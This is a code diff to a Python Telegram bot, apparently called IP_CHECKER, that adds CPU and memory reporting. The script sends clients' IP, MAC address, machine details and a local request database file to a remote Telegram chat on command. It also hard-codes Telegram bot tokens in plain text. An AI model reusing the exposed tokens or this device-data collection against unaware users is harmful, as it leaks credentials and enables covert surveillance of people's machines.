@@ -10,7 +10,9 @@ import ctypes
 import platform
 import telebot
 from uuid import getnode as get_mac
-bot = telebot.TeleBot("6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8")
+import psutil
+
+bot = telebot.TeleBot("6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ")
 
 mac = get_mac()
 
@@ -24,11 +26,24 @@ b = bs4.BeautifulSoup(s.text, "html.parser")
 
 a = b.select(" .ipblockgradient .ip")[0].getText()
 
-url = "https://api.telegram.org/bot6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8/"
+url = "https://api.telegram.org/bot6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ/"
 
 connection = sqlite3.connect("ip.sl3", 5)
 
 cur = connection.cursor()
+
+
+
+cpu_percent = psutil.cpu_percent(interval=1)
+print("Загрузка ЦП:", cpu_percent)
+
+memory_info = psutil.virtual_memory()
+print("Используемая память:", memory_info.percent)
+
+
+
+
+
 
 def last_update(r):
     response = requests.get(r + "getUpdates")
@@ -113,6 +128,12 @@ def main():
             elif get_message_text(upd).lower() == "/start":
                 send_message(get_chat_id(upd),
                              "Я Бот для отримання IP адресів клієнтів програми IP_CHECKER")
+            elif get_message_text(upd).lower() == "/cpu":
+                send_message(get_chat_id(upd),
+                             f"Завантаженість ЦП: {cpu_percent}")
+            elif get_message_text(upd).lower() == "/memory":
+                send_message(get_chat_id(upd),
+                             f"Завантаженість пам'яті: {memory_info.percent}")
             elif get_message_text(upd).lower() == "/request":
                 send_message(get_chat_id(upd),
                              f"Запит клієнта: {ip}")
@@ -163,6 +184,10 @@ def main():
                              f"Машина: {my_system.machine}")
                 send_message(get_chat_id(upd),
                              f"MAC-адрес клієнта: {mac}")
+                send_message(get_chat_id(upd),
+                             f"Завантаженість ЦП: {cpu_percent}")
+                send_message(get_chat_id(upd),
+                             f"Завантаженість пам'яті: {memory_info.percent}")
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
                 upfile = open("ip.sl3", "rb")
